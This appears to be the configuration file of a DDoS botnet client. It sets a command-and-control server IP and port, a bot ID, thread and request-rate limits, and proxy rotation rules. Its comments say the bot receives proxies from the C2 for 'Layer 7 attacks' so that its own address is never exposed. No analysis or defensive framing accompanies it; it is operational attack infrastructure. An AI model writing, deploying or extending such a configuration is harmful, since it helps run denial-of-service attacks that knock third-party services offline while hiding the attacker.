[C2]
IP = 103.124.106.230
PORT = 4884
ID = Bot-01
THREADS = 150
RPS_LIMIT = 1500
BANDWIDTH_LIMIT_MB = 0

# ================================================================
# PROXY SETTINGS (Auto-managed by C2 — DO NOT MODIFY)
# ================================================================
# Proxies are fetched automatically from C2 server during attack.
# The bot receives proxy list via C2 command and uses them for
# all Layer 7 attacks. Direct IP (VPS) is NEVER used.
#
# Supported proxy formats received from C2:
#   - http://ip:port
#   - https://ip:port
#   - socks4://ip:port
#   - socks5://ip:port
#
# Proxy rotation: automatic (round-robin with dead-proxy skipping)
# Proxy health: tracked per-proxy (5 failures = marked dead)
# Fallback: NEVER — if all proxies dead, worker retries
# ================================================================